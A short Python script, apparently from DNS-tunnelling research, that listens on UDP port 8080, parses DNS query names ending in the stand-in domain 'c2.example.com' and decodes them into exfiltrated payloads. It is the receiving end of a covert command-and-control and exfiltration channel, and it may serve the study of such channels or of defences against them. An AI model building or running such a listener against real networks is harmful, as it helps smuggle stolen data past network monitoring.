import socket
from DNS_Research import decode

APEX_DOMAIN = "c2.example.com"
port = 8080

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', port))

def parse_qname(data: bytes, offset: int):                                                
        labels = []                                                                           
        while data[offset] != 0:                                                              
            length = data[offset]                                                             
            offset += 1                                                                       
            labels.append(data[offset:offset + length].decode('ascii'))                       
            offset += length                                                                  
        offset += 1                                                                           
        return '.'.join(labels), offset 

while True:
    data, addr = sock.recvfrom(512) # Receives a duple 
    qname, question_end = parse_qname(data, 12)
     
    if qname.endswith(APEX_DOMAIN):
        payload = decode([qname], APEX_DOMAIN)
        print(f"[+] Payload recebido: {payload}")